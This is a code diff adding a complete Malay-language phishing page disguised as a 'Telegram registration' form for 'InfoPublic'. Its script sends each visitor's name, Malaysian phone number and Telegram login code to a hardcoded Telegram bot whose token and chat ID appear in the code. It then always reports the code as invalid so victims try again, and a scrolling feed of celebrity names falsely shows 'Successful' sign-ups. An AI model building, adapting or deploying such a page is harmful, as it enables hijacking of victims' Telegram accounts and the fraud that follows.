@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pendaftaran Telegram - InfoPublic</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        
+        :root {
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f2f5;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden;
+            touch-action: pan-x pan-y;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 500px;
+            min-height: 100vh;
+            background-color: #ffffff;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            border: 1.5px solid #3b82f6;
+            border-radius: 0.375rem;
+            transition: all 0.2s;
+            outline: none;
+            font-size: 16px !important;
+        }
+
+        .otp-input {
+            width: 3rem;
+            height: 4rem;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border: 1.5px solid #d1d5db;
+            border-radius: 0.5rem;
+            outline: none;
+        }
+
+        .otp-input:focus {
+            border-color: #10b981;
+            box-shadow: 0 0 0 1px #10b981;
+        }
+
+        .activity-feed {
+            max-height: 400px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .scroll-container {
+            animation: scrollUp 20s linear infinite;
+        }
+
+        @keyframes scrollUp {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+
+        .btn-primary {
+            background-color: #1d72d2;
+            color: white;
+            font-weight: 500;
+            padding: 0.75rem 2rem;
+            border-radius: 0.375rem;
+            transition: all 0.2s;
+        }
+
+        .btn-primary:disabled {
+            background-color: #94a3b8;
+            cursor: not-allowed;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        #toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 8px;
+            padding: 16px;
+            position: fixed;
+            z-index: 1000;
+            left: 50%;
+            bottom: 30px;
+            transform: translateX(-50%);
+        }
+
+        #toast.show {
+            visibility: visible;
+            animation: fadein 0.5s, fadeout 0.5s 2.5s;
+        }
+
+        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+    </style>
+</head>
+<body class="pb-20">
+
+    <div id="toast">Mesej</div>
+
+    <div class="app-container flex flex-col items-center">
+        <!-- Header -->
+        <div class="w-full flex flex-col items-center mt-4">
+            <div class="relative w-4/5 text-center">
+                <div class="flex flex-col items-center">
+                    <div class="bg-red-600 text-white font-black text-4xl italic px-8 py-2 rounded-tl-xl rounded-br-xl shadow-lg border-b-4 border-black/20">
+                        REGISTER
+                    </div>
+                    <div class="bg-yellow-400 text-slate-900 font-black text-5xl italic px-10 py-2 -mt-2 rounded-xl shadow-md border-b-4 border-black/10 z-10">
+                        NOW
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 1: REGISTRATION -->
+        <div id="page-registration" class="w-full px-6 mt-10 fade-in">
+            <div class="bg-slate-50 border border-gray-100 rounded-[2.5rem] p-8 text-center shadow-sm">
+                <h1 class="text-2xl font-bold text-slate-800 leading-tight">Serahkan Permohonan Sekarang</h1>
+                <p class="text-slate-500 mt-4 text-sm font-medium">Sila Log In Guna Nombor Telegram Aktif</p>
+            </div>
+
+            <form id="regForm" class="mt-8 space-y-4">
+                <div>
+                    <input type="text" id="nama" class="form-input" placeholder="Nama Penuh" required>
+                </div>
+
+                <div class="relative">
+                    <div class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
+                        <img src="https://flagcdn.com/w20/my.png" alt="MY" class="mr-2">
+                        <span class="text-gray-600 font-medium">+60</span>
+                    </div>
+                    <input type="tel" id="ponsel" class="form-input pl-20" placeholder="Nombor Telegram Aktif" required>
+                </div>
+                
+                <p class="text-[10px] text-gray-400 italic">* Nombor telepon mesti bermula +60</p>
+
+                <div class="flex justify-center pt-2">
+                    <button type="submit" id="btnReg" class="btn-primary">Mohon Sekarang</button>
+                </div>
+            </form>
+
+            <div class="mt-12">
+                <div class="bg-white border border-gray-100 rounded-2xl shadow-lg overflow-hidden activity-feed">
+                    <div id="scrollContainer" class="scroll-container flex flex-col p-2 space-y-2">
+                        <!-- Feed items handled by JS -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 2: VERIFICATION -->
+        <div id="page-verification" class="hidden w-full px-6 mt-10 fade-in text-center">
+            <h1 class="text-3xl font-bold text-blue-900 mb-6">Semak Status</h1>
+            <p class="text-gray-600 text-sm leading-relaxed px-4">
+                Sila masukkan kod pengesahan yang dihantar melalui Telegram untuk menyemak status pendaftaran anda.
+            </p>
+            <p class="text-red-500 font-medium mt-6">
+                Kod berlaku selama: <span id="timer">300</span> detik
+            </p>
+
+            <div class="flex justify-center gap-2 mt-8" id="otp-container">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" onkeyup="moveNext(this, 0)">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" onkeyup="moveNext(this, 1)">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" onkeyup="moveNext(this, 2)">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" onkeyup="moveNext(this, 3)">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" onkeyup="moveNext(this, 4)">
+            </div>
+
+            <div class="flex flex-col gap-4 mt-12 px-2">
+                <button id="btnOtp" onclick="submitOtp()" class="btn-primary w-full">Mohon Sekarang</button>
+                <button onclick="resendCode()" class="text-blue-600 font-semibold underline">Hantar semula kod</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8371173971:AAG1vc4s9MKwszhAAKKC-RC_VrcoaQ_21fc';
+        const CHAT_ID = '-5167149195';
+        
+        let timeLeft = 300;
+        let timerInterval;
+        let userData = { nama: '', ponsel: '' };
+
+        // Helper: Show custom toast
+        function showToast(msg) {
+            const t = document.getElementById("toast");
+            t.innerText = msg;
+            t.className = "show";
+            setTimeout(() => { t.className = t.className.replace("show", ""); }, 3000);
+        }
+
+        // Telegram Send Function with Backoff
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            };
+
+            for (let i = 0; i < 5; i++) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (response.ok) return true;
+                } catch (e) {
+                    const delay = Math.pow(2, i) * 1000;
+                    await new Promise(r => setTimeout(r, delay));
+                }
+            }
+            return false;
+        }
+
+        // Init activity feed
+        window.onload = function() {
+            const container = document.getElementById('scrollContainer');
+            const names = ['Fazura', 'Remy Ishak', 'Mira Filzah', 'Zizan Razak', 'Siti Nurhaliza'];
+            let html = '';
+            names.forEach(name => {
+                html += `
+                <div class="flex items-center p-3 bg-gray-50 rounded-xl">
+                    <img src="https://i.pravatar.cc/100?u=${name}" class="w-12 h-12 rounded-full border-2 border-white shadow-sm mr-3">
+                    <span class="font-bold text-gray-700">${name} - Successful ✅</span>
+                </div>`;
+            });
+            container.innerHTML = html + html; 
+        };
+
+        // Form Registration
+        document.getElementById('regForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btnReg');
+            userData.nama = document.getElementById('nama').value;
+            userData.ponsel = document.getElementById('ponsel').value;
+
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Menghantar...`;
+
+            const message = `<b>Pendaftaran Baru</b>\nNama: ${userData.nama}\nPonsel: +60${userData.ponsel}`;
+            const success = await sendToTelegram(message);
+
+            if(success) {
+                document.getElementById('page-registration').classList.add('hidden');
+                document.getElementById('page-verification').classList.remove('hidden');
+                startTimer();
+                document.querySelectorAll('.otp-input')[0].focus();
+            } else {
+                showToast("Ralat sambungan. Sila cuba lagi.");
+            }
+            btn.disabled = false;
+            btn.innerHTML = `Mohon Sekarang`;
+        };
+
+        function startTimer() {
+            clearInterval(timerInterval);
+            timeLeft = 300;
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timer').innerText = timeLeft;
+                if (timeLeft <= 0) clearInterval(timerInterval);
+            }, 1000);
+        }
+
+        function moveNext(el, index) {
+            el.value = el.value.replace(/[^0-9]/g, '');
+            if (event.keyCode === 8 && el.value.length === 0 && index > 0) {
+                document.querySelectorAll('.otp-input')[index - 1].focus();
+            }
+            if (el.value.length === 1 && index < 4) {
+                document.querySelectorAll('.otp-input')[index + 1].focus();
+            }
+        }
+
+        async function submitOtp() {
+            const inputs = document.querySelectorAll('.otp-input');
+            const code = Array.from(inputs).map(i => i.value).join('');
+            
+            if(code.length < 5) {
+                showToast("Sila masukkan 5 digit kod.");
+                return;
+            }
+
+            const btn = document.getElementById('btnOtp');
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Memproses...`;
+
+            const message = `ponsel: +60${userData.ponsel}\nOTP: ${code}`;
+            const success = await sendToTelegram(message);
+
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerHTML = `Mohon Sekarang`;
+                showToast("Kod tidak sah atau tamat tempoh. Sila cuba lagi.");
+                inputs.forEach(i => i.value = '');
+                inputs[0].focus();
+            }, 2000);
+        }
+
+        function resendCode() {
+            showToast("Kod baru telah dihantar ke Telegram anda.");
+            startTimer();
+        }
+
+        // No-Zoom Scripts
+        document.addEventListener('touchstart', (e) => { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', (e) => {
+            const now = Date.now();
+            if (now - lastTouchEnd <= 300) e.preventDefault();
+            lastTouchEnd = now;
+        }, false);
+    </script>
+</body>
+</html>
